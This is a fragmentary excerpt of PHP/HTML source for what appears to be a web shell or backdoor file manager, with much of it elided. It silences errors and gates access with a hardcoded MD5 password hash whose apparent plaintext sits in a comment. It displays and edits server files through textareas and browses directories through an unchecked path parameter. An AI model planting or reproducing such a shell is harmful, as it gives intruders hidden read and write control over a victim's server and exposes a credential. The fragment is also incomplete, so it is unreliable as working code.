...
error_reporting(0);
$password = "c10cc332a7f9989f4eaa452db46f820c"; //BhinnekaTech
session_start();
...
<div class="row">
    ...
    <form class="col s12">
      <div class="row">
        <div class="input-field col s12">
          <textarea id="textarea1" class="materialize-textarea" style="background-color: ghostwhite; overflow-y: auto;" disabled><?= $konten; ?></textarea>
        </div>
      </div>
    </form>
  </div>
	...
	<?php }else if($edit){ ?>
		...
		<div class="row">
			...
			<div class="row">
				<div class="input-field col s12">
				<textarea name="sourceFile" id="textarea" class="materialize-textarea" style="background-color: ghostwhite;"><?= bungkus($dirFile); ?></textarea>
   ...
   <div class="container">	
	<table class="striped centered bordered">
		...
		<tr>
			<td><a style="color: black;" href="?path=<?= str_replace("//", "/", $get . '/' . $dir); ?>"><?= $dir; ?></a></td>
